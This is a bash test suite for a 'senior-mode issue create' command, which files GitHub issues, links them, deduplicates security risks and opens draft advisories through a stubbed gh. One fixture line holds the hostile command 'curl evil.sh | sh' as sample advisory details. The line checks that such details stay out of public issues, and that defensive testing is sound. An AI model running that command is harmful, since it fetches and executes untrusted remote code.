#!/usr/bin/env bash
# Tests for `senior-mode issue create`. Offline: gh is a stub keeping issues and links in $FIX.
set -u
cli=$(cd "$(dirname "$0")/.." && pwd)/senior-mode
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
failures=0

fail() { echo "FAIL: $*"; failures=$((failures + 1)); }

mkdir -p "$work/stub"
cat >"$work/stub/gh" <<'STUB'
#!/usr/bin/env bash
echo "$*" >>"$GH_LOG"
jqf="" prev=""
for a in "$@"; do [ "$prev" = --jq ] && jqf=$a; prev=$a; done
respond() { if [ -n "$jqf" ]; then jq -r "$jqf"; else cat; fi; }
links() { if [ -f "$FIX/$1" ]; then respond <"$FIX/$1"; else echo '[]' | respond; fi; }
add_link() {
  [ -z "${LINK_ERR:-}" ] || { echo "$LINK_ERR" >&2; exit 1; }
  [ -f "$FIX/$1" ] || echo '[]' >"$FIX/$1"
  jq --argjson n "$(($2 - 1000))" '. + [{number: $n}]' "$FIX/$1" >"$FIX/l" && mv "$FIX/l" "$FIX/$1"
}
arg() { local prev=""; for a in "$@"; do [ "$prev" = "$FLAG" ] && echo "$a"; prev=$a; done; }
case "$*" in
  "issue list"*) respond <"$FIX/issues.json" ;;
  "issue create"*)
    [ -z "${CREATE_ERR:-}" ] || { echo "$CREATE_ERR" >&2; exit 1; }
    [ "$(FLAG=--body-file arg "$@")" != - ] || cat >"$FIX/stdin-body"
    f=$(FLAG=--body-file arg "$@"); [ "$f" != - ] || f="$FIX/stdin-body"
    n=$(jq '[42, (.[].number + 1)] | max' "$FIX/issues.json")
    labels=$(FLAG=--label arg "$@" | jq -R . | jq -sc 'map({name: .})')
    jq --argjson n "$n" --arg t "$(FLAG=--title arg "$@")" --rawfile b "$f" --argjson l "$labels" \
      '. + [{number: $n, title: $t, body: $b, labels: $l}]' \
      "$FIX/issues.json" >"$FIX/i" && mv "$FIX/i" "$FIX/issues.json"
    echo "https://github.com/acme/app/issues/$n" ;;
  "issue edit"*)
    [ "$(FLAG=--body-file arg "$@")" != - ] || cat >"$FIX/stdin-edit-body"
    f=$(FLAG=--body-file arg "$@"); [ -z "$f" ] || [ "$f" = - ] || cp "$f" "$FIX/edit-body" ;;
  "repo view"*) echo "{\"isPrivate\": ${REPO_PRIVATE:-false}}" | respond ;;
  "api -X POST repos/acme/app/security-advisories"*)
    cat >"$FIX/advisory.json"; echo '{"html_url": "https://github.com/acme/app/security/advisories/GHSA-aaaa"}' | respond ;;
  "project item-add"*) echo "ITEM" ;;
  "project item-edit"*) ;;
  "api repos/acme/app/issues/"*"/dependencies/blocked_by --paginate"*) n=${2#repos/acme/app/issues/}; links "blocked-${n%%/*}" ;;
  "api repos/acme/app/issues/"*"/sub_issues --paginate"*) n=${2#repos/acme/app/issues/}; links "subs-${n%%/*}" ;;
  "api -X POST repos/acme/app/issues/"*"/dependencies/blocked_by"*)
    n=${4#repos/acme/app/issues/}; add_link "blocked-${n%%/*}" "${6#issue_id=}" ;;
  "api -X POST repos/acme/app/issues/"*"/sub_issues"*)
    n=${4#repos/acme/app/issues/}; add_link "subs-${n%%/*}" "${6#sub_issue_id=}" ;;
  "api repos/acme/app/issues/"*) n=${2#repos/acme/app/issues/}; echo "{\"id\": $((n + 1000))}" | respond ;;
  *) echo "unexpected: $*" >&2; exit 1 ;;
esac
STUB
chmod +x "$work/stub/gh"
export PATH="$work/stub:$PATH" GH_LOG="$work/gh.log" FIX="$work/fix" SENIOR_MODE_RETRY_DELAY=0

repo="$work/repo"
git init -q "$repo"
git -C "$repo" remote add origin git@github.com:acme/app.git
mkdir -p "$repo/.claude" "$FIX"
cat >"$repo/.claude/senior-mode.json" <<'EOF'
{"project": {"id": "PVT_1", "owner": "acme", "number": 3, "fields": {
  "Status": {"id": "F_S", "options": {"Backlog": "o1", "Ready": "o2"}},
  "Priority": {"id": "F_P", "options": {"P0 now": "o3", "P1 next": "o4"}},
  "Size": {"id": "F_Z", "options": {"S": "o5", "M": "o6", "L": "o7"}},
  "Severity": {"id": "F_V", "options": {"critical": "s1", "high": "s2", "moderate": "s3", "low": "s4"}}}}}
EOF
echo '[{"number": 7, "title": "Epic"}, {"number": 8, "title": "Earlier slice"}]' >"$FIX/issues.json"
printf '## Acceptance criteria\n- Given a, when b, then c.\n' >"$work/body.md"

create() {
  : >"$GH_LOG"
  (cd "$repo" && "$cli" issue create "$@") >"$work/out" 2>"$work/err"
}
logged() { grep -qF -- "$1" "$GH_LOG"; }
count() { grep -cF -- "$1" "$GH_LOG" || true; }
slice=(--title "A slice" --body-file "$work/body.md" --size M --priority "P1 next"
  --milestone "v0.1 Bootstrap" --type feature --blocked-by 8 --parent 7)

# A new slice of an epic.
create "${slice[@]}" || fail "create exited non-zero: $(cat "$work/err")"
logged "issue create --repo acme/app --title A slice --body-file $work/body.md --milestone v0.1 Bootstrap --label type:feature" ||
  fail "issue not created with milestone and type: $(cat "$GH_LOG")"
head -1 "$work/out" | grep -q '^#42 ' || fail "first line does not give the number: $(cat "$work/out")"
for f in "o1" "o4" "o6"; do
  logged "--single-select-option-id $f" || fail "board option $f not set"
done
[ "$(count "project item-add")" -eq 1 ] || fail "item added more than once to the board"
logged "api -X POST repos/acme/app/issues/42/dependencies/blocked_by -F issue_id=1008" || fail "blocked-by link missing"
logged "api -X POST repos/acme/app/issues/7/sub_issues -F sub_issue_id=1042" || fail "not added under the epic"

# Run again: the open issue with the same title is reused, links are not added twice.
create "${slice[@]}" || fail "second run exited non-zero: $(cat "$work/err")"
[ "$(count "issue create")" -eq 0 ] || fail "second run creates a duplicate"
[ "$(count "-X POST")" -eq 0 ] || fail "second run adds links again: $(cat "$GH_LOG")"
head -1 "$work/out" | grep -q '^#42 .*already open' || fail "reuse not reported: $(cat "$work/out")"
logged "--single-select-option-id o1" && fail "reuse without --status resets Status to Backlog"
logged "--single-select-option-id o4" || fail "reuse does not converge Priority"
logged "issue edit 42 --repo acme/app --milestone v0.1 Bootstrap --add-label type:feature" ||
  fail "reuse does not converge milestone and type: $(cat "$GH_LOG")"
create "${slice[@]}" --status Ready || fail "reuse with --status failed: $(cat "$work/err")"
logged "--single-select-option-id o2" || fail "reuse ignores an explicit --status"

# A reused issue gets the new body, and the output says so.
printf '## Acceptance criteria\n- Given d, when e, then f.\n' >"$work/body2.md"
rm -f "$FIX/edit-body"
create --title "A slice" --body-file "$work/body2.md" --size M --priority "P1 next" || fail "body update failed: $(cat "$work/err")"
logged "issue edit 42 --repo acme/app --body-file $work/body2.md" || fail "reused issue body not updated: $(cat "$GH_LOG")"
cmp -s "$work/body2.md" "$FIX/edit-body" || fail "reused issue kept its old body"
head -1 "$work/out" | grep -q 'body updated' || fail "body update not reported: $(cat "$work/out")"
rm -f "$FIX/stdin-edit-body"
echo "from stdin again" | create --title "A slice" --body-file - --size M --priority "P1 next" || fail "stdin body update failed: $(cat "$work/err")"
[ "$(cat "$FIX/stdin-edit-body" 2>/dev/null)" = "from stdin again" ] || fail "stdin body not passed whole to gh issue edit"

# The body can come from stdin.
# shellcheck disable=SC2016 # the backticks must stay text
stdin_body='Given `x`, then y.'
echo "$stdin_body" | create --title "From stdin" --body-file - --size S --priority "P0 now" ||
  fail "stdin body refused: $(cat "$work/err")"
[ "$(cat "$FIX/stdin-body" 2>/dev/null)" = "$stdin_body" ] || fail "stdin body not passed whole to gh"

# A reused issue of another type swaps its type label.
echo '[{"number": 9, "title": "Typed", "labels": [{"name": "type:bug"}, {"name": "needs-info"}]}]' >"$FIX/issues.json"
create --title "Typed" --body-file "$work/body.md" --size S --priority "P0 now" --type feature ||
  fail "typed reuse failed: $(cat "$work/err")"
logged "issue edit 9 --repo acme/app --add-label type:feature --remove-label type:bug" ||
  fail "old type label kept: $(cat "$GH_LOG")"
logged "--remove-label needs-info" && fail "a non-type label removed"
echo '[{"number": 9, "title": "Typed", "labels": [{"name": "type:feature"}, {"name": "type: bug"}]}]' >"$FIX/issues.json"
create --title "Typed" --body-file "$work/body.md" --size S --priority "P0 now" --type feature ||
  fail "typed reuse failed: $(cat "$work/err")"
logged "--remove-label type:feature" && fail "the asked type label removed"
grep -q -- "--remove-label type: bug$" "$GH_LOG" || fail "a label with a space is split: $(cat "$GH_LOG")"

# --help prints this command's usage and succeeds.
create --help || fail "--help exits non-zero"
grep -q -- '--blocked-by' "$work/out" || fail "--help does not list the flags: $(cat "$work/out")"

# Defaults: Status Backlog, no milestone, label or links.
create --title "Small" --body-file "$work/body.md" --size S --priority "P0 now" ||
  fail "minimal create failed: $(cat "$work/err")"
logged "--single-select-option-id o1" || fail "default status is not Backlog"
logged "--milestone" && fail "milestone passed without --milestone"
logged "--label" && fail "label passed without --type"

# --severity sets the Severity field and the security label. Critical is P0 and high is P1; given
# with --priority too, the stricter of the two wins.
sev=(--title "A risk" --body-file "$work/body.md" --size S)
create "${sev[@]}" --severity critical || fail "critical without --priority refused: $(cat "$work/err")"
logged "--field-id F_V --single-select-option-id s1" || fail "Severity not set: $(cat "$GH_LOG")"
logged "--field-id F_P --single-select-option-id o3" || fail "critical is not P0: $(cat "$GH_LOG")"
logged "--label security" || fail "security label not set on creation: $(cat "$GH_LOG")"
create "${sev[@]}" --severity high || fail "high without --priority refused: $(cat "$work/err")"
logged "--field-id F_P --single-select-option-id o4" || fail "high is not P1: $(cat "$GH_LOG")"
create "${sev[@]}" --severity critical --priority "P1 next" || fail "critical with a softer priority failed: $(cat "$work/err")"
logged "--field-id F_P --single-select-option-id o3" || fail "a softer --priority beats critical: $(cat "$GH_LOG")"
logged "--field-id F_P --single-select-option-id o4" && fail "both priorities set"
create "${sev[@]}" --severity high --priority "P0 now" || fail "high with a stricter priority failed: $(cat "$work/err")"
logged "--field-id F_P --single-select-option-id o3" || fail "a stricter --priority is lowered by high: $(cat "$GH_LOG")"
create "${sev[@]}" --severity low --priority "P1 next" || fail "low with a priority failed: $(cat "$work/err")"
logged "--field-id F_V --single-select-option-id s4" || fail "low Severity not set"
logged "--field-id F_P --single-select-option-id o4" || fail "low changes the priority: $(cat "$GH_LOG")"
create --title "A typed risk" --body-file "$work/body.md" --size S --severity low --priority "P1 next" --type bug || fail "severity with a type failed: $(cat "$work/err")"
logged "--label type:bug --label security" || fail "type and security labels not both set: $(cat "$GH_LOG")"
echo '[{"number": 9, "title": "A risk", "labels": []}]' >"$FIX/issues.json"
create "${sev[@]}" --severity critical || fail "reuse with severity failed: $(cat "$work/err")"
logged "issue edit 9 --repo acme/app --add-label security" || fail "reused issue does not get the security label: $(cat "$GH_LOG")"
logged "--field-id F_V --single-select-option-id s1" || fail "reused issue does not converge Severity"
echo '[{"number": 7, "title": "Epic"}, {"number": 8, "title": "Earlier slice"}]' >"$FIX/issues.json"
create --title "Plain" --body-file "$work/body.md" --size S --priority "P1 next" || fail "plain create failed"
logged "security" && fail "security label or Severity without --severity: $(cat "$GH_LOG")"

# A risk outside the ticket: --kind, --path and --rule give a security-id line in the body, and an
# open issue that carries it is reported instead of filed again.
risk=(--title "Shell injection in deploy" --body-file "$work/body.md" --size S --severity high
  --kind injection --path scripts/deploy.sh --rule unquoted-variable)
id=$(printf '%s\n%s\n%s\n' injection scripts/deploy.sh unquoted-variable | sha256sum | cut -d' ' -f1)
echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
create "${risk[@]}" || fail "a risk with a fingerprint refused: $(cat "$work/err")"
logged "issue create --repo acme/app --title Shell injection in deploy" || fail "risk not filed: $(cat "$GH_LOG")"
logged "--label security" || fail "risk without the security label: $(cat "$GH_LOG")"
[ "$(jq -r '.[] | select(.number == 42) | .body' "$FIX/issues.json" | grep -c "^security-id: $id\$")" -eq 1 ] ||
  fail "body lacks the line security-id: <sha256>: $(jq -r '.[-1].body' "$FIX/issues.json")"
jq -r '.[-1].body' "$FIX/issues.json" | grep -q "Given a, when b, then c" || fail "the body text is lost"
create "${risk[@]}" --title "Same risk, another title" || fail "duplicate risk run failed: $(cat "$work/err")"
[ "$(count "issue create")" -eq 0 ] || fail "a risk with the same fingerprint is filed twice"
[ "$(count "issue edit")" -eq 0 ] || fail "the existing risk was edited"
head -1 "$work/out" | grep -q '^#42 .*already filed' || fail "existing issue not reported: $(cat "$work/out")"
create "${risk[@]}" --path scripts/other.sh --title "Other file" || fail "another path refused: $(cat "$work/err")"
logged "issue create" || fail "another path is deduplicated"
create "${risk[@]}" --rule quoted --title "Other rule" || fail "another rule refused: $(cat "$work/err")"
logged "issue create" || fail "another rule is deduplicated"
# A closed issue does not count: the list is of open issues.
logged "--state open" || fail "the fingerprint is searched in closed issues: $(cat "$GH_LOG")"
# A title clash is not a duplicate: with a fingerprint, an open issue of the same title that has no
# or another security-id is left alone and the risk is filed as a new issue.
echo '[{"number": 7, "title": "Epic"}, {"number": 50, "title": "Shell injection in deploy", "labels": [], "body": "Unrelated ticket"}]' >"$FIX/issues.json"
create "${risk[@]}" || fail "a title clash refused: $(cat "$work/err")"
[ "$(count "issue create")" -eq 1 ] || fail "a title clash is not filed as a new issue: $(cat "$GH_LOG")"
[ "$(count "issue edit")" -eq 0 ] || fail "a fingerprinted risk edited another issue: $(cat "$GH_LOG")"
[ "$(jq -r '.[] | select(.number == 50) | .body' "$FIX/issues.json")" = "Unrelated ticket" ] || fail "the other issue lost its body"
# The line must be in an open issue labelled security: a plain issue quoting it does not count.
echo "[{\"number\": 60, \"title\": \"Quote\", \"labels\": [], \"body\": \"security-id: $id\"}]" >"$FIX/issues.json"
create "${risk[@]}" || fail "a quoted security-id refused: $(cat "$work/err")"
[ "$(count "issue create")" -eq 1 ] || fail "an issue without the security label counts as the risk: $(cat "$GH_LOG")"
printf '[{"number": 61, "title": "Found", "labels": [{"name": "security"}], "body": "x\\nsecurity-id: %s"}]\n' "$id" >"$FIX/issues.json"
create "${risk[@]}" || fail "a labelled duplicate failed: $(cat "$work/err")"
head -1 "$work/out" | grep -q '^#61 .*already filed' || fail "labelled duplicate not found: $(cat "$work/out")"
# A newline in a part would let two risks hash alike: refused.
bad_fp=(--title "X" --body-file "$work/body.md" --size S --severity high)
create "${bad_fp[@]}" --kind $'a\nb' --path c --rule d && fail "a newline in --kind accepted"
create "${bad_fp[@]}" --kind a --path $'b\nc' --rule d && fail "a newline in --path accepted"
create "${bad_fp[@]}" --kind a --path b --rule $'c\nd' && fail "a newline in --rule accepted"
[ "$(count "issue create")" -eq 0 ] || fail "created despite a newline in the fingerprint"
echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"

# The fingerprint also works with a body on stdin.
echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
echo "from stdin" | create --title "From stdin risk" --body-file - --size S --severity high \
  --kind injection --path scripts/deploy.sh --rule unquoted-variable || fail "fingerprint with stdin failed: $(cat "$work/err")"
jq -r '.[-1].body' "$FIX/issues.json" | grep -q "^from stdin" || fail "stdin body lost"
jq -r '.[-1].body' "$FIX/issues.json" | grep -q "^security-id: $id\$" || fail "stdin body lacks the security-id"

# Critical in a public repository: a draft advisory holds the details, the issue never does.
echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
printf 'Payload: curl evil.sh | sh\n' >"$work/details.md"
crit=("${risk[@]}" --severity critical)
rm -f "$FIX/advisory.json"
create "${crit[@]}" --details-file "$work/details.md" || fail "critical with details refused: $(cat "$work/err")"
logged "api -X POST repos/acme/app/security-advisories" || fail "no advisory opened: $(cat "$GH_LOG")"
jq -e '.summary == "Shell injection in deploy" and .severity == "critical" and (.description | contains("evil.sh"))' \
  "$FIX/advisory.json" >/dev/null || fail "advisory lacks summary, severity or details: $(cat "$FIX/advisory.json")"
jq -r '.[-1].body' "$FIX/issues.json" | grep -q "evil.sh" && fail "details leaked into the issue body"
grep -q "GHSA-aaaa" "$work/out" || fail "advisory not reported: $(cat "$work/out")"
logged "--field-id F_P --single-select-option-id o3" || fail "critical risk is not P0"
# A rerun finds the issue and opens no second advisory.
create "${crit[@]}" --details-file "$work/details.md" || fail "critical rerun failed: $(cat "$work/err")"
logged "security-advisories" && fail "a second advisory for the same risk"
[ "$(count "issue create")" -eq 0 ] || fail "critical rerun files the risk again"
# Details on stdin.
echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
rm -f "$FIX/advisory.json"
echo "secret details" | create "${crit[@]}" --details-file - || fail "details on stdin refused: $(cat "$work/err")"
jq -e '.description | contains("secret details")' "$FIX/advisory.json" >/dev/null || fail "stdin details not in the advisory"
# Public and critical without details, or both bodies on stdin: refused before anything is created.
echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
create "${crit[@]}" && fail "critical in a public repository without --details-file accepted"
[ "$(count "issue create")" -eq 0 ] || fail "issue created without the advisory details"
echo x | create "${crit[@]}" --body-file - --details-file - && fail "two stdin sources accepted"
# Private repository: no advisory, said so.
REPO_PRIVATE=true create "${crit[@]}" || fail "critical in a private repository failed: $(cat "$work/err")"
logged "security-advisories" && fail "advisory opened in a private repository"
grep -qi "private" "$work/out" || fail "private repository skip not said: $(cat "$work/out")"
logged "issue create" || fail "private repository: risk not filed"
# A high risk opens no advisory, and does not look at the repository.
create "${risk[@]}" --title "High one" --path other.sh || fail "high risk failed"
logged "security-advisories" && fail "advisory for a non-critical risk"
logged "repo view" && fail "repository visibility read for a non-critical risk"

# Bad input is refused before anything is created.
bad() {
  create "$@" && fail "accepted: $*"
  [ "$(count "issue create")" -eq 0 ] || fail "created despite bad input: $*"
}
bad --title "X" --body-file "$work/body.md" --size XL --priority "P0 now"
bad --title "X" --body-file "$work/body.md" --size S --priority "urgent"
bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --status Doing
bad --title "X" --body-file "$work/missing.md" --size S --priority "P0 now"
bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --type epic
bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --blocked-by seven
bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --blocked-by ""
bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --parent 0
bad --body-file "$work/body.md" --size S --priority "P0 now"
bad --title "X" --body-file "$work/body.md" --size S --priority
bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --severity urgent
bad --title "X" --body-file "$work/body.md" --size S --severity moderate
bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --severity
bad --title "X" --body-file "$work/body.md" --size S --severity high --kind injection --path a.sh
bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --kind injection --path a.sh --rule r
bad --title "X" --body-file "$work/body.md" --size S --severity high --kind "" --path a.sh --rule r
bad --title "X" --body-file "$work/body.md" --size S --severity high --details-file "$work/details.md"
bad --title "X" --body-file "$work/body.md" --size S --severity critical --kind k --path a.sh --rule r --details-file "$work/missing.md"

# A failed create stops before touching the board.
CREATE_ERR="milestone 'v9' not found" create --title "Y" --body-file "$work/body.md" --size S --priority "P0 now" &&
  fail "a failed create exits zero"
logged "project item-add" && fail "board touched after a failed create"

# A failed link is reported, not hidden.
LINK_ERR="HTTP 422: cycle" create --title "Z" --body-file "$work/body.md" --size S --priority "P0 now" --blocked-by 8 &&
  fail "a failed link exits zero"
grep -q cycle "$work/err" || fail "link error not shown: $(cat "$work/err")"

[ "$failures" -eq 0 ] && echo "issue: all cases pass"
exit "$failures"
